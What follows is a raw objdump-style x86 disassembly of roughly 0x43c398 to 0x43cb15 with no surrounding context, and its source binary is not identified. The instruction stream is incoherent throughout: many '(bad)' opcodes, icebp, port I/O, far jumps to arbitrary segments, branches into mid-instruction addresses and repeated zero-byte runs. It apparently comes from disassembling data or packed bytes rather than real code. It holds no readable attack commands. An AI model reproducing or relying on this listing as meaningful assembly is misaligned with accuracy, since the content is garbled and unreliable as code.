  43c398:	sbb    BYTE PTR [ebx+esi*2+0x6f],bh
  43c39c:	inc    ebx
  43c39d:	retf   0xaf7d
  43c3a0:	jl     0x43c3ce
  43c3a2:	push   eax
  43c3a3:	add    eax,0xebf7d1bd
  43c3a8:	clc    
  43c3a9:	(bad)  
  43c3aa:	icebp  
  43c3ab:	imul   edx,DWORD PTR [edx],0xffffffe9
  43c3ae:	jmp    0x43c3b4
  43c3b0:	call   0xf92f2f64
  43c3b5:	stos   BYTE PTR es:[edi],al
  43c3b6:	dec    esi
  43c3b7:	sbb    al,BYTE PTR [eax]
  43c3b9:	jmp    0x2cc07134
  43c3be:	mov    BYTE PTR [edx+0x73],al
  43c3c1:	in     al,dx
  43c3c2:	icebp  
  43c3c3:	inc    esp
  43c3c4:	sbb    eax,0x7b6f39e4
  43c3c9:	jmp    0x43c361
  43c3cb:	jae    0x43c3d0
  43c3cd:	push   0xffffffbb
  43c3cf:	or     eax,0x44f1aa03
  43c3d4:	sbb    eax,0x7b7039ea
  43c3d9:	jmp    0x81463755
  43c3de:	add    BYTE PTR [eax],al
  43c3e0:	add    BYTE PTR [eax],al
  43c3e2:	add    bh,ch
  43c3e4:	in     al,dx
  43c3e5:	clc    
  43c3e6:	xor    ax,bp
  43c3e9:	(bad)  
  43c3ea:	call   0x9200c665
  43c3ef:	jne    0x43c3da
  43c3f1:	clc    
  43c3f2:	dec    esi
  43c3f3:	mov    ecx,0xef007b6e
  43c3f8:	inc    ebx
  43c3f9:	ins    DWORD PTR es:[edi],dx
  43c3fa:	push   es
  43c3fb:	inc    esp
  43c3fc:	repnz idiv edi
  43c3ff:	mov    ds:0xa17be0c6,eax
  43c404:	add    dh,bh
  43c406:	sbb    DWORD PTR [ecx],0x27
  43c409:	stc    
  43c40a:	ret    0x704f
  43c40d:	cli    
  43c40e:	pop    ds
  43c40f:	loopne 0x43c40e
  43c411:	out    0x6b,eax
  43c413:	add    DWORD PTR [edx],0x26d983f7
  43c419:	add    al,0xc3
  43c41b:	test   BYTE PTR [ebp+esi*8-0x1],ah
  43c41f:	mov    ds:0x9e233d83,eax
  43c424:	(bad)  
  43c425:	loopne 0x43c3e5
  43c427:	nop
  43c428:	out    dx,eax
  43c429:	imul   eax
  43c42b:	mov    es,WORD PTR [edx]
  43c42d:	idiv   edi
  43c42f:	jno    0xfc0cc442
  43c435:	add    BYTE PTR [ebp+0x56],0x6
  43c439:	cmp    eax,0x1b39cf23
  43c43e:	add    ecx,DWORD PTR [edi]
  43c440:	xor    DWORD PTR [ebp+0x16],0x5d
  43c444:	push   0xfffffffe
  43c446:	out    0x0,eax
  43c448:	add    BYTE PTR [eax],al
  43c44a:	add    BYTE PTR [eax],al
  43c44c:	mov    eax,0xffff7ef
  43c451:	jnp    0x43c490
  43c453:	sbb    cl,BYTE PTR [ebp+0x3a]
  43c456:	sbb    eax,DWORD PTR [ebx-0x3d05dca7]
  43c45c:	lahf   
  43c45d:	cmp    ecx,0xe831201f
  43c463:	xchg   BYTE PTR [eax-0x29170811],ah
  43c469:	add    edi,esi
  43c46b:	call   FWORD PTR [edi+0x29000d81]
  43c471:	cld    
  43c472:	add    BYTE PTR [ebp+0x75],0xf3
  43c476:	add    eax,DWORD PTR [ebx-0x6a]
  43c479:	pop    esp
  43c47a:	inc    edi
  43c47b:	sbb    eax,0x7a7d1c73
  43c480:	mov    ebx,edx
  43c482:	ja     0x43c486
  43c484:	int    0xc4
  43c486:	stc    
  43c487:	clc    
  43c488:	rcr    BYTE PTR [ebx],cl
  43c48a:	test   DWORD PTR [edx+0x6f],eax
  43c48d:	fiadd  DWORD PTR [edi+0x1d]
  43c490:	mul    BYTE PTR [ebp+0xb7fe1d]
  43c496:	pop    eax
  43c497:	cld    
  43c498:	mov    dl,0xff
  43c49a:	jmp    0x43c433
  43c49c:	test   eax,0x207cf907
  43c4a1:	xlat   BYTE PTR ds:[ebx]
  43c4a2:	cld    
  43c4a3:	jb     0x43c513
  43c4a5:	fs inc edi
  43c4a7:	push   ss
  43c4a8:	je     0x43c450
  43c4aa:	sbb    eax,0x7fc307d
  43c4af:	mov    ebp,0x0
  43c4b4:	add    dh,dh
  43c4b6:	dec    ebp
  43c4b7:	adc    bh,bh
  43c4b9:	add    edi,ebx
  43c4bb:	in     al,0x35
  43c4bd:	jb     0x43c47c
  43c4bf:	stc    
  43c4c0:	mov    esp,0xff161efe
  43c4c5:	mov    ecx,0x96427cf8
  43c4ca:	fnstcw WORD PTR [ebp-0x6606819]
  43c4d0:	clc    
  43c4d1:	pop    ebp
  43c4d2:	(bad)  
  43c4d3:	(bad)  
  43c4d4:	clc    
  43c4d5:	inc    edx
  43c4d6:	pop    ecx
  43c4d7:	adc    BYTE PTR [edx],0x74
  43c4da:	adc    eax,0x7c8ce802
  43c4df:	stc    
  43c4e0:	clc    
  43c4e1:	ss jno 0x43c52c
  43c4e4:	push   ss
  43c4e5:	je     0x43c50d
  43c4e7:	sbb    eax,0xfeb8b07d
  43c4ec:	mov    esp,0xf900221d
  43c4f1:	or     al,BYTE PTR [ebx]
  43c4f3:	data16 and BYTE PTR [edi+0x4],0xd9
  43c4f8:	add    eax,0xfe50f00d
  43c4fd:	in     eax,dx
  43c4fe:	sar    DWORD PTR [esi],0xf3
  43c501:	loope  0x43c4f0
  43c503:	inc    ecx
  43c504:	mov    dh,BYTE PTR [edi]
  43c506:	or     al,ch
  43c508:	dec    eax
  43c509:	js     0x43c48c
  43c50b:	stos   DWORD PTR es:[edi],eax
  43c50c:	and    dl,bl
  43c50e:	sar    BYTE PTR [esi],0xe3
  43c511:	shr    ebp,0x21
  43c514:	jmp    0x43c4ac
  43c516:	out    dx,al
  43c517:	sbb    esi,edi
  43c519:	add    BYTE PTR [eax],al
  43c51b:	add    BYTE PTR [eax],al
  43c51d:	add    BYTE PTR [ecx],bh
  43c51f:	outs   dx,DWORD PTR ds:[esi]
  43c520:	stc    
  43c521:	or     BYTE PTR [edi],ch
  43c523:	add    al,0xff
  43c525:	aad    0xac
  43c527:	in     eax,dx
  43c528:	add    edx,eax
  43c52a:	stc    
  43c52b:	inc    edi
  43c52c:	fld    QWORD PTR [esi+esi*1]
  43c52f:	and    DWORD PTR [esi+0x48],esp
  43c532:	jo     0x43c534
  43c534:	es jmp 0x43c504
  43c537:	jmp    0x1dec31d
  43c53c:	(bad)  
  43c53e:	jge    0x43c4c1
  43c540:	push   ebx
  43c541:	push   ss
  43c542:	jne    0x43c5bb
  43c544:	in     eax,dx
  43c545:	sub    bh,0xf8
  43c548:	in     eax,0xc
  43c54a:	neg    BYTE PTR [ebp-0x7e8afc1a]
  43c550:	xor    ecx,DWORD PTR [esi]
  43c552:	jns    0x43c551
  43c554:	pop    eax
  43c555:	mov    ds:0xebe6ed4a,al
  43c55a:	loopne 0x43c547
  43c55c:	cdq    
  43c55d:	std    
  43c55e:	stc    
  43c55f:	adc    BYTE PTR [ebx],0x16
  43c562:	xor    dh,BYTE PTR [esi-0x13]
  43c565:	sub    BYTE PTR [edi-0x9f31a08],0x7d
  43c56c:	out    0x3,al
  43c56e:	jne    0x43c4f1
  43c570:	push   ebx
  43c572:	sub    ch,0x9
  43c575:	pop    edi
  43c576:	imul   esp
  43c578:	clc    
  43c579:	jmp    0x5f3e348c
  43c57e:	clc    
  43c57f:	lods   eax,DWORD PTR ds:[esi]
  43c580:	jl     0x43c556
  43c582:	add    BYTE PTR [eax],al
  43c584:	add    BYTE PTR [eax],al
  43c586:	add    BYTE PTR [eax-0xa068c14],cl
  43c58c:	addr16 push es
  43c58e:	jmp    0x276:0xe96b8171
  43c595:	call   0xf92d965f
  43c59a:	sub    dh,ah
  43c59c:	addr16 adc ch,dl
  43c59f:	dec    ebx
  43c5a0:	(bad)  
  43c5a1:	jl     0x43c53f
  43c5a3:	ins    BYTE PTR es:[edi],dx
  43c5a4:	out    dx,eax
  43c5a5:	jae    0x43c55a
  43c5a7:	sahf   
  43c5a8:	push   esi
  43c5a9:	cli    
  43c5aa:	push   cs
  43c5ab:	test   al,0xad
  43c5ad:	jl     0x43c533
  43c5af:	mov    BYTE PTR [esi],al
  43c5b1:	jae    0x43c5a0
  43c5b3:	cmc    
  43c5b4:	addr16 push es
  43c5b6:	jmp    0xe988:0xa1e83a0b
  43c5bd:	clc    
  43c5be:	stos   BYTE PTR es:[edi],al
  43c5bf:	cmc    
  43c5c0:	addr16 adc ah,ah
  43c5c3:	add    eax,DWORD PTR [eax]
  43c5c5:	call   0xf92f38df
  43c5ca:	stos   BYTE PTR es:[edi],al
  43c5cb:	cmc    
  43c5cc:	push   0xfeebef12
  43c5d1:	jl     0x43c60f
  43c5d3:	outs   dx,DWORD PTR ds:[esi]
  43c5d4:	in     eax,dx
  43c5d5:	jae    0x43c5da
  43c5d7:	popa   
  43c5d8:	es cli 
  43c5da:	scas   al,BYTE PTR es:[edi]
  43c5db:	dec    ecx
  43c5dc:	scas   eax,DWORD PTR es:[edi]
  43c5dd:	jl     0x43c603
  43c5df:	imul   eax,DWORD PTR [ecx],0x73
  43c5e2:	push   ebp
  43c5e4:	push   0xaabea06
  43c5e9:	jge    0x43c5f7
  43c5eb:	add    BYTE PTR [eax],al
  43c5ed:	add    BYTE PTR [eax],al
  43c5ef:	add    BYTE PTR [edx+eax*2+0x73],ah
  43c5f3:	add    BYTE PTR [eax],ch
  43c5f5:	xor    DWORD PTR [ebp+0xe],0xc
  43c5f9:	je     0x43c607
  43c5fb:	call   0x3bb418
  43c600:	(bad)  
  43c602:	(bad)  
  43c603:	std    
  43c604:	fwait
  43c605:	out    dx,al
  43c606:	mov    ebx,0xf909d18b
  43c60b:	inc    esp
  43c60c:	jg     0x43c58f
  43c60e:	cmp    eax,0xe0c2de23
  43c613:	out    dx,al
  43c614:	ss out dx,al
  43c616:	imul   eax
  43c618:	fsubp  st(2),st
  43c61a:	idiv   edi
  43c61c:	pop    edi
  43c61d:	ins    BYTE PTR es:[edi],dx
  43c61e:	push   cs
  43c61f:	add    al,0x19
  43c621:	push   es
  43c622:	call   0xf832600c
  43c627:	ret    
  43c628:	inc    edi
  43c629:	inc    esp
  43c62a:	adc    al,BYTE PTR [ecx]
  43c62c:	loope  0x43c650
  43c62e:	jnp    0x43c675
  43c630:	mov    edi,0x69e8bb02
  43c635:	jmp    0x10c8c631
  43c63a:	repz dec DWORD PTR [ebx-0x63e98995]
  43c641:	je     0x43c641
  43c643:	out    0xd0,eax
  43c645:	jmp    0x8413c641
  43c64a:	jne    0x43c662
  43c64c:	pop    esi
  43c64d:	jb     0x43c64d
  43c64f:	out    0x4,eax
  43c651:	jmp    0x44c64d
  43c656:	add    BYTE PTR [eax],al
  43c658:	add    BYTE PTR [edi],cl
  43c65a:	xor    DWORD PTR [ebp+0x16],0x4f
  43c65e:	jb     0x43c65e
  43c660:	out    0xf8,eax
  43c662:	call   0x8363c65e
  43c667:	jne    0x43c67f
  43c669:	push   eax
  43c66a:	jb     0x43c66a
  43c66c:	out    0xac,eax
  43c66e:	jmp    0x98b9c66a
  43c673:	cmp    BYTE PTR [edx-0x7d],0xe6
  43c677:	outs   dx,DWORD PTR ds:[esi]
  43c678:	add    cl,BYTE PTR ds:0x1af8f74d
  43c67e:	cwde   
  43c67f:	cmp    BYTE PTR [edx+0x6b],0xdc
  43c683:	jbe    0x43c687
  43c685:	sbb    eax,0x2f8f761
  43c68a:	sbb    BYTE PTR [ecx+0x3fda5f42],cl
  43c690:	sbb    eax,0xfe219df6
  43c695:	mov    bh,0x40
  43c697:	mov    ebx,0x8143e2f5
  43c69c:	jp     0x43c621
  43c69e:	fldcw  WORD PTR [edi+0x2]
  43c6a1:	ffree  st(4)
  43c6a3:	idiv   eax
  43c6a5:	retf   0x8117
  43c6a8:	jp     0x43c715
  43c6aa:	fisubr DWORD PTR [edi+0x2]
  43c6ad:	int    0x78
  43c6af:	idiv   eax
  43c6b1:	mov    dl,0x17
  43c6b3:	cmp    DWORD PTR [edx-0x7d],0x8d0f6fd7
  43c6ba:	mov    ch,0xfa
  43c6bc:	clc    
  43c6bd:	add    BYTE PTR [eax],al
  43c6bf:	add    BYTE PTR [eax],al
  43c6c1:	add    BYTE PTR [edx+0x76067757],bl
  43c6c7:	ins    DWORD PTR es:[edi],dx
  43c6c8:	push   ebx
  43c6c9:	call   0xf939a50a
  43c6ce:	mov    dh,0x57
  43c6d0:	js     0x43c6e4
  43c6d2:	jbe    0x43c72a
  43c6d4:	(bad)  
  43c6d5:	out    0xb0,eax
  43c6d7:	into   
  43c6d8:	cmc    
  43c6d9:	clc    
  43c6da:	ss pop ebp
  43c6dc:	js     0x43c6f0
  43c6de:	jns    0x43c706
  43c6e0:	adc    ebp,eax
  43c6e2:	pop    ebp
  43c6e4:	cmc    
  43c6e5:	clc    
  43c6e6:	imul   BYTE PTR [esi]
  43c6e8:	or     bh,ch
  43c6ea:	(bad)  
  43c6eb:	call   0x383e8d4
  43c6f0:	mov    ds:0x1b85f9fa,al
  43c6f5:	adc    dh,BYTE PTR [esi+0x6f]
  43c6f8:	jmp    0x8a2b47e8
  43c6fd:	cli    
  43c6fe:	loope  0x43c685
  43c700:	add    edx,DWORD PTR [edx]
  43c702:	ja     0x43c773
  43c704:	fsubr  st,st(3)
  43c706:	jne    0x43c6f4
  43c708:	jno    0x43c704
  43c70a:	mov    DWORD PTR [edi-0x23],esp
  43c70d:	push   es
  43c70e:	mov    esi,esi
  43c710:	dec    esi
  43c711:	push   es
  43c712:	(bad)  
  43c713:	jmp    0xe81e8d71
  43c718:	push   edx
  43c719:	cli    
  43c71a:	in     eax,dx
  43c71b:	lds    ebx,FWORD PTR [ebp+0x40]
  43c71e:	mov    eax,DWORD PTR [ebx]
  43c720:	lods   al,BYTE PTR ds:[esi]
  43c721:	es pop eax
  43c723:	aas    
  43c724:	push   es
  43c725:	pop    es
  43c726:	add    BYTE PTR [eax],al
  43c728:	add    BYTE PTR [eax],al
  43c72a:	add    BYTE PTR [eax],dl
  43c72c:	fild   DWORD PTR [eax]
  43c72e:	dec    ch
  43c730:	jmp    0x2ab3f9a
  43c735:	pushf  
  43c736:	add    ebp,ecx
  43c738:	jecxz  0x43c754
  43c73a:	cli    
  43c73b:	lods   eax,DWORD PTR ds:[esi]
  43c73c:	lds    esp,FWORD PTR [ebp+0x78]
  43c73f:	xchg   DWORD PTR [ebx],eax
  43c741:	xchg   esp,eax
  43c742:	add    DWORD PTR [ebp-0x6205fd31],ecx
  43c748:	lds    esp,FWORD PTR [ebp+0x78]
  43c74b:	addr16 add al,0x7c
  43c74e:	adc    al,0x9d
  43c750:	(bad)  
  43c751:	out    dx,eax
  43c752:	stc    
  43c753:	jge    0x43c6da
  43c755:	arpl   WORD PTR [esi],cx
  43c757:	js     0x43c7ce
  43c759:	xor    eax,0xd1e62cec
  43c75e:	stc    
  43c75f:	sub    DWORD PTR [ebp+0x6e60124b],eax
  43c765:	jmp    0xba29d055
  43c76a:	stc    
  43c76b:	adc    DWORD PTR [ebp-0x198cc01],eax
  43c771:	jb     0x43c74b
  43c773:	dec    esi
  43c774:	mov    dh,dh
  43c776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c777:	cmp    al,0x66
  43c779:	jnp    0x43c76e
  43c77b:	jns    0x43c7eb
  43c77d:	sub    DWORD PTR [ecx-0x710712f8],eax
  43c783:	cmp    BYTE PTR [esi+0x7b],ah
  43c786:	fistp  WORD PTR [ebx]
  43c788:	je     0x43c78c
  43c78a:	xchg   ecx,eax
  43c78b:	cld    
  43c78c:	in     al,dx
  43c78d:	clc    
  43c78e:	jbe    0x43c790
  43c790:	add    BYTE PTR [eax],al
  43c792:	add    BYTE PTR [eax],al
  43c794:	xor    BYTE PTR [esi+0x7b],ah
  43c797:	xlat   BYTE PTR ds:[ebx]
  43c798:	je     0x43c80f
  43c79a:	sqrtps xmm7,XMMWORD PTR [ebp-0xf]
  43c79e:	clc    
  43c79f:	pop    esi
  43c7a0:	clc    
  43c7a1:	imul   eax,DWORD PTR [esi],0xffffffea
  43c7a4:	pop    edx
  43c7a5:	mul    bh
  43c7a7:	shr    edx,1
  43c7a9:	jmp    0x570cf2a6
  43c7ae:	cld    
  43c7af:	ds int3 
  43c7b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c7b2:	test   BYTE PTR [eax+ebp*2-0x7f5bc17],ch
  43c7b9:	inc    ebx
  43c7ba:	sbb    eax,0x9ce0b1ea
  43c7bf:	and    BYTE PTR [ecx+ebp*8+0x284947c],ch
  43c7c6:	jae    0x43c7af
  43c7c8:	mov    ss,WORD PTR [edx-0x4]
  43c7cb:	push   es
  43c7cc:	pushf  
  43c7cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43c7ce:	jl     0x43c84c
  43c7d0:	fs jmp 0x3ee2b749
  43c7d6:	cld    
  43c7d7:	out    dx,al
  43c7d8:	jge    0x43c77f
  43c7da:	jl     0x43c840
  43c7dc:	addr16 call 0x33a2bc55
  43c7e2:	not    esi
  43c7e4:	ins    DWORD PTR es:[edi],dx
  43c7e5:	addr16 jnp 0x43c7cb
  43c7e8:	jns    0x43c7e3
  43c7ea:	add    DWORD PTR [eax],0xffffffb7
  43c7ed:	(bad)  
  43c7ee:	(bad)  
  43c7ef:	jmp    DWORD PTR [ebx+ebx*1]
  43c7f2:	cld    
  43c7f3:	inc    DWORD PTR [ebx]
  43c7f5:	mov    edi,0x7d7b
  43c7fa:	add    BYTE PTR [eax],al
  43c7fc:	add    BYTE PTR [edx],ch
  43c7fe:	jmp    FWORD PTR [ebp+ebx*1-0x31]
  43c802:	jo     0x43c7fe
  43c804:	jns    0x55ab01d
  43c80a:	jmp    0x43c803
  43c80c:	xor    DWORD PTR [ecx-0x8],0xfffffffa
  43c810:	jae    0x43c864
  43c812:	(bad)  
  43c813:	or     bh,ah
  43c815:	xchg   ebx,eax
  43c816:	jmp    0xfff7:0xf010e8bb
  43c81d:	iret   
  43c81e:	jle    0x43c895
  43c820:	push   ss
  43c821:	or     BYTE PTR [ecx-0x2],bl
  43c824:	out    0xdc,eax
  43c826:	out    dx,eax
  43c827:	idiv   edi
  43c829:	lahf   
  43c82a:	jle    0x43c8a1
  43c82c:	push   ss
  43c82d:	fstp   DWORD PTR [eax-0x2]
  43c830:	out    0x98,eax
  43c832:	out    0xf7,al
  43c834:	call   FWORD PTR [edi-0x25e98a82]
  43c83a:	pop    eax
  43c83b:	or     eax,ebp
  43c83d:	sub    eax,0x4ffff7eb
  43c842:	jo     0x43c846
  43c844:	add    ecx,DWORD PTR [eax]
  43c846:	sbb    eax,0xea87dde8
  43c84b:	test   ebx,0x70e700f
  43c851:	sbb    DWORD PTR [edx],edx
  43c853:	jnp    0x43c8d2
  43c855:	sahf   
  43c856:	adc    ebp,DWORD PTR [ebp+0x11]
  43c859:	je     0x43c802
  43c85b:	lock call DWORD PTR [ebx+0xa7583]
  43c862:	add    BYTE PTR [eax],al
  43c864:	add    BYTE PTR [eax],al
  43c866:	(bad)  
  43c867:	push   edi
  43c868:	or     al,0xe8
  43c86a:	sbb    al,0xeb
  43c86c:	idiv   edi
  43c86e:	jne    0x43c80c
  43c870:	jmp    0x43c827
  43c872:	pop    esi
  43c873:	mov    eax,0x15eebcf0
  43c878:	push   ss
  43c879:	(bad)  
  43c87a:	mov    ecx,0x96427cfc
  43c87f:	fdivr  QWORD PTR [ebp-0xf4eb119]
  43c885:	clc    
  43c886:	neg    BYTE PTR ds:0xeea8000a
  43c88c:	in     al,0x90
  43c88e:	sub    eax,0xa07cf090
  43c893:	jecxz  0x43c892
  43c895:	or     al,dh
  43c897:	cmp    BYTE PTR [eax+eax*1],al
  43c89a:	jne    0x43c82d
  43c89c:	xor    ah,0xa
  43c89f:	jo     0x43c85e
  43c8a1:	jl     0x43c823
  43c8a3:	iret   
  43c8a4:	add    esi,DWORD PTR [ebx+0x60]
  43c8a7:	push   ecx
  43c8a8:	js     0x43c8a2
  43c8aa:	repnz inc edi
  43c8ac:	jge    0x43c928
  43c8ae:	jg     0x43c88c
  43c8b0:	add    DWORD PTR [ebx-0x32708],eax
  43c8b6:	int    0xa4
  43c8b8:	cmc    
  43c8b9:	clc    
  43c8ba:	rcr    BYTE PTR [ebx],cl
  43c8bc:	jge    0x43c938
  43c8be:	arpl   bx,bx
  43c8c0:	outs   dx,DWORD PTR ds:[esi]
  43c8c1:	adc    ecx,ebp
  43c8c3:	mov    ecx,0x5bbaf8f4
  43c8c8:	ja     0x43c8d0
  43c8ca:	add    BYTE PTR [eax],al
  43c8cc:	add    BYTE PTR [eax],al
  43c8ce:	add    BYTE PTR [esi-0x28],dh
  43c8d1:	jg     0x43c938
  43c8d3:	jne    0x43c8ae
  43c8d5:	cld    
  43c8d6:	out    0x3c,eax
  43c8d8:	adc    al,0xf1
  43c8da:	clc    
  43c8db:	mov    dh,0x5b
  43c8dd:	ja     0x43c8f1
  43c8df:	jbe    0x43c94f
  43c8e1:	adc    al,0xe8
  43c8e3:	xor    esi,ecx
  43c8e5:	icebp  
  43c8e6:	clc    
  43c8e7:	not    BYTE PTR [ebp+0x7]
  43c8ea:	std    
  43c8eb:	add    DWORD PTR [edx],eax
  43c8ed:	ss in  al,dx
  43c8ef:	mov    al,0xe9
  43c8f1:	fdecstp 
  43c8f3:	sub    DWORD PTR [edx+0x6f790e53],eax
  43c8f9:	loope  0x43c8e6
  43c8fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c8fc:	jmp    0x8255bfc2
  43c901:	cmp    ecx,DWORD PTR [esi]
  43c903:	jbe    0x43c974
  43c905:	fsubr  st,st(3)
  43c907:	popa   
  43c908:	jmp    0x2ed:0x67b9f6a9
  43c90f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43c910:	xor    cl,BYTE PTR [edi-0x6e19dfea]
  43c916:	ret    0x67a1
  43c919:	icebp  
  43c91a:	std    
  43c91b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43c91c:	adc    ecx,DWORD PTR [edi+0x79e60d07]
  43c922:	or     BYTE PTR [edi+0x6a70e5f8],0xda
  43c929:	fdivp  st(2),st
  43c92b:	std    
  43c92c:	in     eax,0x25
  43c92e:	sub    BYTE PTR [edi+0xc],0xe2
  43c932:	jbe    0x43c934
  43c934:	add    BYTE PTR [eax],al
  43c936:	add    BYTE PTR [eax],al
  43c938:	je     0x43c914
  43c93a:	pop    ebx
  43c93b:	out    dx,al
  43c93c:	fucom  st(5)
  43c93e:	cmp    eax,0x3cefd2fd
  43c943:	test   ch,0xc1
  43c946:	ins    DWORD PTR es:[edi],dx
  43c947:	inc    eax
  43c948:	arpl   WORD PTR [ebx],ax
  43c94a:	lods   al,BYTE PTR ds:[esi]
  43c94b:	and    al,BYTE PTR [eax+0x3f]
  43c94e:	push   es
  43c94f:	add    bh,al
  43c951:	fcmove st,st(0)
  43c953:	sti    
  43c954:	lods   eax,DWORD PTR ds:[esi]
  43c955:	in     eax,0x65
  43c957:	js     0x43c8e0
  43c959:	add    bl,BYTE PTR [esp+edx*1-0x9ee2f73]
  43c960:	popf   
  43c961:	add    DWORD PTR [ebx-0x67916ff7],0xffe8bceb
  43c96b:	cmc    
  43c96c:	mov    BYTE PTR [esi-0x1a979384],ah
  43c972:	jae    0x43c96c
  43c974:	pop    esi
  43c975:	scas   al,BYTE PTR es:[edi]
  43c976:	lock fisub WORD PTR [eax+0x66]
  43c97a:	jnp    0x43c95f
  43c97c:	jne    0x43c9ef
  43c97e:	ror    DWORD PTR ss:[eax],0xef
  43c982:	clc    
  43c983:	(bad)  
  43c984:	xor    al,0x66
  43c986:	jnp    0x43c95f
  43c988:	je     0x43c9fb
  43c98a:	xadd   DWORD PTR ds:0xf4aef8f2,edx
  43c991:	addr16 push es
  43c993:	jmp    0xea2f:0x49e807a3
  43c99a:	clc    
  43c99b:	stos   BYTE PTR es:[edi],al
  43c99c:	add    BYTE PTR [eax],al
  43c99e:	add    BYTE PTR [eax],al
  43c9a0:	add    ah,dh
  43c9a2:	addr16 adc ch,dl
  43c9a5:	mov    esi,ebp
  43c9a7:	out    0x74,eax
  43c9a9:	and    dl,ch
  43c9ab:	clc    
  43c9ac:	push   0xffffff82
  43c9ae:	cld    
  43c9af:	cld    
  43c9b0:	sti    
  43c9b1:	jp     0x43c98d
  43c9b3:	xchg   BYTE PTR [ebx+0x0],dh
  43c9b6:	jmp    0x5ef8:0xeef451bc
  43c9bd:	mov    ah,0x7d
  43c9bf:	inc    edx
  43c9c0:	repz ja 0x43ca04
  43c9c3:	sbb    eax,0xfe079a6a
  43c9c8:	sub    eax,ecx
  43c9ca:	aas    
  43c9cb:	sbb    eax,0x8e48a26
  43c9d0:	jmp    0xa53dcc4b
  43c9d5:	xchg   esp,eax
  43c9d6:	cmp    BYTE PTR [edx-0x35],0x79
  43c9da:	jno    0x43c9de
  43c9dc:	adc    DWORD PTR [eax-0x14],eax
  43c9df:	clc    
  43c9e0:	push   ss
  43c9e1:	mov    ah,0x7d
  43c9e3:	inc    edx
  43c9e4:	retf   0xb071
  43c9e7:	pop    es
  43c9e8:	add    BYTE PTR [ecx],cl
  43c9ea:	add    al,BYTE PTR [esi-0x477e63fd]
  43c9f0:	add    al,0x8b
  43c9f2:	sar    BYTE PTR [edi+0x208e45],1
  43c9f8:	add    BYTE PTR [ebx+eax*8-0x9],bl
  43c9fc:	inc    ebp
  43c9fd:	jg     0x43c9eb
  43c9ff:	cmp    eax,0x1a6ccc22
  43ca04:	sldt   WORD PTR [eax]
  43ca07:	add    BYTE PTR [eax],al
  43ca09:	add    cl,al
  43ca0b:	in     al,0xe0
  43ca0d:	xor    eax,0xc3f7ef36
  43ca12:	(bad)  
  43ca13:	cmp    al,0xfe
  43ca15:	shl    BYTE PTR ds:0xd7065579,1
  43ca1b:	and    al,0x1b
  43ca1d:	psrld  mm6,mm7
  43ca20:	test   BYTE PTR [edx+ebx*4],al
  43ca23:	add    al,BYTE PTR [eax]
  43ca25:	or     esp,0xffffffe3
  43ca28:	not    eax
  43ca2a:	xchg   edi,eax
  43ca2b:	dec    esp
  43ca2c:	(bad)  
  43ca2d:	sar    ch,1
  43ca2f:	js     0x43ca76
  43ca31:	push   es
  43ca32:	fucomip st,st(6)
  43ca34:	cmp    eax,0x1a248a23
  43ca39:	or     BYTE PTR [ecx],0x22
  43ca3c:	pop    es
  43ca3d:	jne    0x43ca21
  43ca3f:	xlat   BYTE PTR ds:[ebx]
  43ca40:	cli    
  43ca41:	stc    
  43ca42:	dec    ebx
  43ca43:	out    dx,al
  43ca44:	mov    ebx,0x723118b
  43ca49:	mov    dh,0xcc
  43ca4b:	sub    esp,DWORD PTR [esp+esi*2+0x749f2bae]
  43ca52:	fisubr DWORD PTR [ebx]
  43ca54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ca55:	je     0x43ca2d
  43ca57:	sub    esp,DWORD PTR [edi+0x72bd274]
  43ca5d:	je     0x43c9fd
  43ca5f:	(bad)  
  43ca61:	(bad)
  43ca64:	clc    
  43ca65:	mov    dh,BYTE PTR [ebp-0x6a]
  43ca68:	pop    ds
  43ca69:	or     ebx,esp
  43ca6b:	loope  0x43c9ee
  43ca6d:	add    eax,DWORD PTR [eax]
  43ca6f:	add    BYTE PTR [eax],al
  43ca71:	add    BYTE PTR [eax],al
  43ca73:	add    ebx,ecx
  43ca75:	cld    
  43ca76:	jl     0x43ca2d
  43ca78:	(bad)  
  43ca7a:	iret   
  43ca7b:	mov    ebx,0xb6fffc96
  43ca80:	aam    0x3a
  43ca82:	sbb    eax,0x80221673
  43ca87:	call   0x7bb6c783
  43ca8c:	shr    DWORD PTR [eax-0x3f4ba50a],0x84
  43ca93:	mov    eax,0x75b1fcf8
  43ca98:	in     eax,0x8c
  43ca9a:	jae    0x43ca1f
  43ca9c:	in     eax,dx
  43ca9d:	mov    al,ds:0xa7d57f73
  43caa2:	jae    0x43cb0f
  43caa4:	frstor [esi-0x5a3a988d]
  43caaa:	jae    0x43caff
  43caac:	int    0x9a
  43caae:	jae    0x43caff
  43cab0:	mov    ch,0x99
  43cab2:	jae    0x43cb0f
  43cab4:	mov    ebp,0xa5577398
  43cab9:	lahf   
  43caba:	jae    0x43cb1f
  43cabc:	lods   eax,DWORD PTR ds:[esi]
  43cabd:	sahf   
  43cabe:	jae    0x43cb1f
  43cac0:	xchg   ebp,eax
  43cac1:	popf   
  43cac2:	jae    0x43ca4f
  43cac4:	sbb    eax,0x5877460
  43cac9:	pop    edi
  43caca:	je     0x43cb3f
  43cacc:	or     eax,0xf56f745e
  43cad1:	pop    esp
  43cad2:	je     0x43cb4f
  43cad4:	std    
  43cad5:	cld    
  43cad6:	jae    0x43cad8
  43cad8:	add    BYTE PTR [eax],al
  43cada:	add    BYTE PTR [eax],al
  43cadc:	ja     0x43cb2e
  43cade:	or     dl,al
  43cae0:	cmp    dl,bl
  43cae2:	add    eax,DWORD PTR [ebp-0x4e0307d0]
  43cae8:	jge    0x43caec
  43caea:	je     0x43caf4
  43caec:	(bad)  
  43caed:	(bad)  
  43caee:	out    0x86,al
  43caf0:	loop   0x43caef
  43caf2:	adc    esp,edx
  43caf4:	mov    ah,0x3c
  43caf6:	call   0xac269afe
  43cafb:	es (bad) 
  43cafd:	cmp    al,0xc5
  43caff:	cmp    edi,0x1f
  43cb02:	loop   0x43cb7c
  43cb04:	ja     0x43cae0
  43cb06:	sahf   
  43cb07:	in     al,dx
  43cb08:	ins    DWORD PTR es:[edi],dx
  43cb09:	loop   0x43cab0
  43cb0b:	jle    0x43cac4
  43cb0d:	and    eax,0x8f7ab9ea
  43cb12:	push   0xffffff81
  43cb14:	pop    edx
  43cb15:	push   es
